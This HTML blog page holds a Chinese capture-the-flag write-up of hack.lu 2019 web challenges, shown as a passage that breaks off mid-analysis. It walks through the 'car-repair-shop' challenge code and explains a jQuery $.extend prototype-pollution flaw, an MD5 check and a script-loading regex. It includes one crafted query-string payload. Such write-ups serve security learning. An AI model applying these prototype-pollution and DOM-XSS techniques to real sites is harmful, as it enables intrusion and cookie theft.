<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta name="description" content="前言这两天打了hack.lu ctf感觉题目都还不错，因此总结一波。 car-repair-shop题目涉及到的知识。原型链的污染，url正则表达式绕过，DOM-XSS题目描述：1&amp;quot;Your Car broke down?! Come to our shop, we repair all cars! Even very old ones.&amp;quot;  题目地址如下Enter the s">
<meta property="og:type" content="article">
<meta property="og:title" content="hack.lu 2019的部分web题解">
<meta property="og:url" content="http://yoursite.com/2019/12/19/hack-lu-2019的部分web题解/index.html">
<meta property="og:site_name" content="L&#39;s Blog">
<meta property="og:description" content="前言这两天打了hack.lu ctf感觉题目都还不错，因此总结一波。 car-repair-shop题目涉及到的知识。原型链的污染，url正则表达式绕过，DOM-XSS题目描述：1&amp;quot;Your Car broke down?! Come to our shop, we repair all cars! Even very old ones.&amp;quot;  题目地址如下Enter the s">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/car-repair-shop.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/flag-requestbin.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/website.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/csp.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/site.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/internal.png">
<meta property="og:updated_time" content="2019-12-19T12:51:11.842Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="hack.lu 2019的部分web题解">
<meta name="twitter:description" content="前言这两天打了hack.lu ctf感觉题目都还不错，因此总结一波。 car-repair-shop题目涉及到的知识。原型链的污染，url正则表达式绕过，DOM-XSS题目描述：1&amp;quot;Your Car broke down?! Come to our shop, we repair all cars! Even very old ones.&amp;quot;  题目地址如下Enter the s">
<meta name="twitter:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/car-repair-shop.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2019/12/19/hack-lu-2019的部分web题解/">





  <title>hack.lu 2019的部分web题解 | L's Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">L's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">share with you</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/19/hack-lu-2019的部分web题解/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Ljdd520">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="L's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">hack.lu 2019的部分web题解</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-19T20:36:47+08:00">
                2019-12-19
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  6.5k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  29
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这两天打了hack.lu ctf感觉题目都还不错，因此总结一波。</p>
<h4 id="car-repair-shop"><a href="#car-repair-shop" class="headerlink" title="car-repair-shop"></a>car-repair-shop</h4><h4 id="题目涉及到的知识。"><a href="#题目涉及到的知识。" class="headerlink" title="题目涉及到的知识。"></a>题目涉及到的知识。</h4><h5 id="原型链的污染，url正则表达式绕过，DOM-XSS"><a href="#原型链的污染，url正则表达式绕过，DOM-XSS" class="headerlink" title="原型链的污染，url正则表达式绕过，DOM-XSS"></a>原型链的污染，url正则表达式绕过，DOM-XSS</h5><h4 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;Your Car broke down?! Come to our shop, we repair all cars! Even very old ones.&quot;</span><br></pre></td></tr></table></figure>

<h5 id="题目地址如下Enter-the-shop"><a href="#题目地址如下Enter-the-shop" class="headerlink" title="题目地址如下Enter the shop"></a>题目地址如下<a href="https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/" target="_blank" rel="noopener">Enter the shop</a></h5><h4 id="题目分析："><a href="#题目分析：" class="headerlink" title="题目分析："></a>题目分析：</h4><h5 id="访问题目给的链接后将呈现下面的界面："><a href="#访问题目给的链接后将呈现下面的界面：" class="headerlink" title="访问题目给的链接后将呈现下面的界面："></a>访问题目给的链接后将呈现下面的界面：</h5><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/car-repair-shop.png" alt></p>
<h6 id="在这里我们可以看到几个按钮，单击这些按钮将执行某些功能。"><a href="#在这里我们可以看到几个按钮，单击这些按钮将执行某些功能。" class="headerlink" title="在这里我们可以看到几个按钮，单击这些按钮将执行某些功能。"></a>在这里我们可以看到几个按钮，单击这些按钮将执行某些功能。</h6><h6 id="下面是一个消息框，该消息框在执行某些功能后会更新内容。"><a href="#下面是一个消息框，该消息框在执行某些功能后会更新内容。" class="headerlink" title="下面是一个消息框，该消息框在执行某些功能后会更新内容。"></a>下面是一个消息框，该消息框在执行某些功能后会更新内容。</h6><h6 id="在底部，还有一个名为get-your-cookie的按钮，该按钮将导致一个可以引用URL的子页面"><a href="#在底部，还有一个名为get-your-cookie的按钮，该按钮将导致一个可以引用URL的子页面" class="headerlink" title="在底部，还有一个名为get your cookie的按钮，该按钮将导致一个可以引用URL的子页面"></a>在底部，还有一个名为<code>get your cookie</code>的按钮，该按钮将导致一个可以引用URL的子页面</h6><h6 id="提交url后浏览器将会自动访问。"><a href="#提交url后浏览器将会自动访问。" class="headerlink" title="提交url后浏览器将会自动访问。"></a>提交url后浏览器将会自动访问。</h6><h6 id="这个大图看起来我们需要去构造一个url包含我们的payload去提交它。"><a href="#这个大图看起来我们需要去构造一个url包含我们的payload去提交它。" class="headerlink" title="这个大图看起来我们需要去构造一个url包含我们的payload去提交它。"></a>这个大图看起来我们需要去构造一个url包含我们的payload去提交它。</h6><h6 id="当他被访问时，我们必须以某种方式参入这个flag。"><a href="#当他被访问时，我们必须以某种方式参入这个flag。" class="headerlink" title="当他被访问时，我们必须以某种方式参入这个flag。"></a>当他被访问时，我们必须以某种方式参入这个flag。</h6><h6 id="这个按钮的名字个数我们这个flag在cookie里面。"><a href="#这个按钮的名字个数我们这个flag在cookie里面。" class="headerlink" title="这个按钮的名字个数我们这个flag在cookie里面。"></a>这个按钮的名字个数我们这个flag在cookie里面。</h6><h5 id="该页面很小并且包含了其他几个有趣的文件："><a href="#该页面很小并且包含了其他几个有趣的文件：" class="headerlink" title="该页面很小并且包含了其他几个有趣的文件："></a>该页面很小并且包含了其他几个有趣的文件：</h5><ul>
<li>index.html</li>
<li>car.class.js</li>
<li>util.js</li>
<li>jquery.min.js</li>
<li>jquery.md5.js</li>
</ul>
<h5 id="util-js负责建立类似于事件处理程序的页面，然后开始执行一些代码。"><a href="#util-js负责建立类似于事件处理程序的页面，然后开始执行一些代码。" class="headerlink" title="util.js负责建立类似于事件处理程序的页面，然后开始执行一些代码。"></a><code>util.js</code>负责建立类似于事件处理程序的页面，然后开始执行一些代码。</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> urlParams = <span class="keyword">new</span> URLSearchParams(<span class="built_in">window</span>.location.search);</span><br><span class="line"><span class="keyword">const</span> h = location.hash.slice(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">const</span> bugatti = <span class="keyword">new</span> Car(<span class="string">'Bugatti'</span>, <span class="string">'T35'</span>, <span class="string">'green'</span>, <span class="string">'assets/images/bugatti.png'</span>)</span><br><span class="line"><span class="keyword">const</span> porsche = <span class="keyword">new</span> Car(<span class="string">'Porsche'</span>, <span class="string">'911'</span>, <span class="string">'yellow'</span>, <span class="string">'assets/images/porsche.png'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cars = [bugatti, porsche]</span><br><span class="line"></span><br><span class="line">porsche.repair = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!bugatti.isStarted())&#123;</span><br><span class="line">        infobox(<span class="string">`Not so fast. Repair the other car first!`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($.md5(porsche) == <span class="string">'9cdfb439c7876e703e307864c9167a15'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(urlParams.has(<span class="string">'help'</span>)) &#123;</span><br><span class="line">            repairWithHelper(urlParams.get(<span class="string">'help'</span>))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        infobox(<span class="string">`Repairing this is not that easy.`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">porsche.ignition = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    infobox(<span class="string">`Hmm ... WTF!`</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> [car] = cars</span><br><span class="line">    $(<span class="string">'.fa-power-off'</span>).click(<span class="function"><span class="params">()</span> =&gt;</span> car.powerOn())</span><br><span class="line">    $(<span class="string">'.fa-car'</span>).click(<span class="function"><span class="params">()</span> =&gt;</span> car.info())</span><br><span class="line">    $(<span class="string">'.fa-lightbulb-o'</span>).click(<span class="function"><span class="params">()</span> =&gt;</span> car.light())</span><br><span class="line">    $(<span class="string">'.fa-battery-quarter'</span>).click(<span class="function"><span class="params">()</span> =&gt;</span> car.battery())</span><br><span class="line">    $(<span class="string">'.fa-key'</span>).click(<span class="function"><span class="params">()</span> =&gt;</span> car.ignition())</span><br><span class="line">    $(<span class="string">'.fa-wrench'</span>).click(<span class="function"><span class="params">()</span> =&gt;</span> car.repair())</span><br><span class="line"></span><br><span class="line">    $(<span class="string">'.fa-step-forward'</span>).click(<span class="function"><span class="params">()</span> =&gt;</span> nextCar())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(h.includes(<span class="string">'Bugatti'</span>))</span><br><span class="line">        autoStart(bugatti)</span><br><span class="line">    <span class="keyword">if</span>(h.includes(<span class="string">'Porsche'</span>))</span><br><span class="line">        autoStart(porsche)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> nextCar = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    cars.push(cars.shift())</span><br><span class="line">    $(<span class="string">".image"</span>).attr(<span class="string">'src'</span>, cars[<span class="number">0</span>].pic);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> autoStart = <span class="function">(<span class="params">car</span>) =&gt;</span> &#123;</span><br><span class="line">    car.repair()</span><br><span class="line">    car.ignition()</span><br><span class="line">    car.powerOn()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> repairWithHelper = <span class="function">(<span class="params">src</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">/* who needs csp anyways !? */</span></span><br><span class="line">    urlRegx = <span class="regexp">/^\w&#123;4,5&#125;:\/\/car-repair-shop\.fluxfingersforfuture\.fluxfingers\.net\/[\w\d]+\/.+\.js$/</span>;</span><br><span class="line">    <span class="keyword">if</span> (urlRegx.test(src)) &#123;</span><br><span class="line">        <span class="keyword">let</span> s = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>)</span><br><span class="line">        s.src = src</span><br><span class="line">        $(<span class="string">'head'</span>).append(s)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> infobox = <span class="function">(<span class="params">text</span>) =&gt;</span> &#123;</span><br><span class="line">    $(<span class="string">'a'</span>).css(&#123;<span class="string">'pointer-events'</span>: <span class="string">'none'</span>, <span class="string">'border'</span>: <span class="string">'none'</span>&#125;)</span><br><span class="line">    $(<span class="string">'.infobox'</span>).addClass(<span class="string">'infoAnimate'</span>)</span><br><span class="line">        .text(text)</span><br><span class="line">        .on(<span class="string">'animationend'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            $(<span class="keyword">this</span>).removeClass(<span class="string">'infoAnimate'</span>)</span><br><span class="line">            $(<span class="string">'a'</span>).css(&#123;<span class="string">'pointer-events'</span>: <span class="string">'all'</span>, <span class="string">'border'</span>: <span class="string">'solid 1px rgba(255, 255, 255, .25)'</span>&#125;)</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="这autoStart函数将会执行repair，ignition和powerOn汽车的方法作为参数传递。"><a href="#这autoStart函数将会执行repair，ignition和powerOn汽车的方法作为参数传递。" class="headerlink" title="这autoStart函数将会执行repair，ignition和powerOn汽车的方法作为参数传递。"></a>这<code>autoStart</code>函数将会执行<code>repair</code>，ignition和powerOn汽车的方法作为参数传递。</h6><h6 id="这repair函数访问该URL并解析与相同名称的功能的查询参数的JSON对象："><a href="#这repair函数访问该URL并解析与相同名称的功能的查询参数的JSON对象：" class="headerlink" title="这repair函数访问该URL并解析与相同名称的功能的查询参数的JSON对象："></a>这<code>repair</code>函数访问该URL并解析与相同名称的功能的查询参数的JSON对象：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">repair() &#123;</span><br><span class="line">    <span class="keyword">if</span>(urlParams.has(<span class="string">'repair'</span>)) &#123;</span><br><span class="line">        $.extend(<span class="literal">true</span>, <span class="keyword">this</span>, <span class="built_in">JSON</span>.parse(urlParams.get(<span class="string">'repair'</span>)))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="该代码将JSON对象中提供的属性和值与该Car对象合并。这很危险，并且会造成原型链污染漏洞。详细介绍请看此处"><a href="#该代码将JSON对象中提供的属性和值与该Car对象合并。这很危险，并且会造成原型链污染漏洞。详细介绍请看此处" class="headerlink" title="该代码将JSON对象中提供的属性和值与该Car对象合并。这很危险，并且会造成原型链污染漏洞。详细介绍请看此处"></a>该代码将JSON对象中提供的属性和值与该<code>Car</code>对象合并。这很危险，并且会造成原型链污染漏洞。详细介绍请看<a href="https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/" target="_blank" rel="noopener">此处</a></h6><h6 id="我们能重写Car的-proto-属性，并且引入其他的属性。"><a href="#我们能重写Car的-proto-属性，并且引入其他的属性。" class="headerlink" title="我们能重写Car的__proto__属性，并且引入其他的属性。"></a>我们能重写<code>Car</code>的<code>__proto__</code>属性，并且引入其他的属性。</h6><h6 id="接下来是这个ignition函数。"><a href="#接下来是这个ignition函数。" class="headerlink" title="接下来是这个ignition函数。"></a>接下来是这个<code>ignition</code>函数。</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ignition() &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.key == <span class="string">""</span>) &#123;</span><br><span class="line">        infobox(<span class="string">`Looks like the key got lost. No wonder the car is not starting ...`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.key == <span class="string">"🔑"</span>) &#123;</span><br><span class="line">        infobox(<span class="string">`The car started!`</span>)</span><br><span class="line">        <span class="keyword">this</span>.start()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">``</span><span class="string">` </span></span><br><span class="line"><span class="string">###### 我们需要设置`</span>Car<span class="string">`对象的key属性来启动它。否则，这三个功能中的最后一个`</span>powerOn<span class="string">`将无法将我们带到下一辆车：</span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>javascript</span><br><span class="line">powerOn() &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.isStarted()) &#123;</span><br><span class="line">        infobox(<span class="string">`Well Done!`</span>)</span><br><span class="line">        nextCar()</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $(<span class="string">'.chargeup'</span>)[<span class="number">0</span>].play()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cars = [bugatti, porsche]</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> nextCar = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    cars.push(cars.shift())</span><br><span class="line">    $(<span class="string">".image"</span>).attr(<span class="string">'src'</span>, cars[<span class="number">0</span>].pic);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="要修复，bugatti我们只要key在url中指定emoji表情的值，然后repair-function将完成其工作："><a href="#要修复，bugatti我们只要key在url中指定emoji表情的值，然后repair-function将完成其工作：" class="headerlink" title="要修复，bugatti我们只要key在url中指定emoji表情的值，然后repair-function将完成其工作："></a>要修复，<code>bugatti</code>我们只要<code>key</code>在url中指定emoji表情的值，然后repair-function将完成其工作：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?repair=&#123;%22key%22:%22%F0%9F%94%91%22&#125;</span><br></pre></td></tr></table></figure>

<h6 id="这将把我们带到porsche。这里对repair和点火功能进行了一些自定义："><a href="#这将把我们带到porsche。这里对repair和点火功能进行了一些自定义：" class="headerlink" title="这将把我们带到porsche。这里对repair和点火功能进行了一些自定义："></a>这将把我们带到<code>porsche</code>。这里对<code>repair</code>和点火功能进行了一些自定义：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">porsche.repair = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!bugatti.isStarted())&#123;</span><br><span class="line">        infobox(<span class="string">`Not so fast. Repair the other car first!`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($.md5(porsche) == <span class="string">'9cdfb439c7876e703e307864c9167a15'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(urlParams.has(<span class="string">'help'</span>)) &#123;</span><br><span class="line">            repairWithHelper(urlParams.get(<span class="string">'help'</span>))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        infobox(<span class="string">`Repairing this is not that easy.`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">porsche.ignition = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    infobox(<span class="string">`Hmm ... WTF!`</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="这个ignition函数是不重要的，因为他只是输出一些文本。"><a href="#这个ignition函数是不重要的，因为他只是输出一些文本。" class="headerlink" title="这个ignition函数是不重要的，因为他只是输出一些文本。"></a>这个<code>ignition</code>函数是不重要的，因为他只是输出一些文本。</h6><h6 id="而这个repair函数有一些特殊的方法。"><a href="#而这个repair函数有一些特殊的方法。" class="headerlink" title="而这个repair函数有一些特殊的方法。"></a>而这个<code>repair</code>函数有一些特殊的方法。</h6><h6 id="1-在bugatti启动之前。"><a href="#1-在bugatti启动之前。" class="headerlink" title="1. 在bugatti启动之前。"></a>1. 在<code>bugatti</code>启动之前。</h6><h6 id="2-porsche对象的MD5值需要是9cdfb439c7876e703e307864c9167a15"><a href="#2-porsche对象的MD5值需要是9cdfb439c7876e703e307864c9167a15" class="headerlink" title="2. porsche对象的MD5值需要是9cdfb439c7876e703e307864c9167a15"></a>2. <code>porsche</code>对象的<code>MD5</code>值需要是<code>9cdfb439c7876e703e307864c9167a15</code></h6><h6 id="1-已经使用了正确的key在url中，是非常好的。"><a href="#1-已经使用了正确的key在url中，是非常好的。" class="headerlink" title="(1) 已经使用了正确的key在url中，是非常好的。"></a>(1) 已经使用了正确的<code>key</code>在url中，是非常好的。</h6><h6 id="2-需要去做的是。这个MD5的值是等于这个字符串lol-你可以查看最受欢迎的hash表，例如：crackstation-net-。"><a href="#2-需要去做的是。这个MD5的值是等于这个字符串lol-你可以查看最受欢迎的hash表，例如：crackstation-net-。" class="headerlink" title="(2) 需要去做的是。这个MD5的值是等于这个字符串lol(你可以查看最受欢迎的hash表，例如：crackstation.net)。"></a>(2) 需要去做的是。这个MD5的值是等于这个字符串<code>lol</code>(你可以查看最受欢迎的hash表，例如：crackstation.net)。</h6><h6 id="那么我们这样去计算对象的哈希值呢？看到jquery-md5-js他展现了计算对象的哈希值，将显示的通过toString方法获得对象的字符串表示的哈希值。"><a href="#那么我们这样去计算对象的哈希值呢？看到jquery-md5-js他展现了计算对象的哈希值，将显示的通过toString方法获得对象的字符串表示的哈希值。" class="headerlink" title="那么我们这样去计算对象的哈希值呢？看到jquery.md5.js他展现了计算对象的哈希值，将显示的通过toString方法获得对象的字符串表示的哈希值。"></a>那么我们这样去计算对象的哈希值呢？看到<code>jquery.md5.js</code>他展现了计算对象的哈希值，将显示的通过<code>toString</code>方法获得对象的字符串表示的哈希值。</h6><h6 id="要改变对象的字符串表达形式，我们需要去重写这个方法，但是在这是不可能的。"><a href="#要改变对象的字符串表达形式，我们需要去重写这个方法，但是在这是不可能的。" class="headerlink" title="要改变对象的字符串表达形式，我们需要去重写这个方法，但是在这是不可能的。"></a>要改变对象的字符串表达形式，我们需要去重写这个方法，但是在这是不可能的。</h6><h6 id="我们不能创建或者改变这个方法对于通过jquery的扩展对于repair函数，仅仅改变属性，由于他是JSON。"><a href="#我们不能创建或者改变这个方法对于通过jquery的扩展对于repair函数，仅仅改变属性，由于他是JSON。" class="headerlink" 